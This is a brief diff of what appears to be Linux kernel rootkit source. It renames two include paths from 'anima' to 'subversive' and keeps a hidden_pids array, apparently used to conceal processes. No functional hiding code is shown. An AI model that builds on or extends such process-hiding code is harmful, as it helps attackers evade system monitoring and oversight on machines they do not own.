@@ -1,7 +1,7 @@
 #include <linux/printk.h>
 
-#include <anima/config.h>
-#include <anima/ksyms.h>
+#include <subversive/config.h>
+#include <subversive/ksyms.h>
 
 static int hidden_pids[MAX_HIDDEN_PIDS] = {0};
 
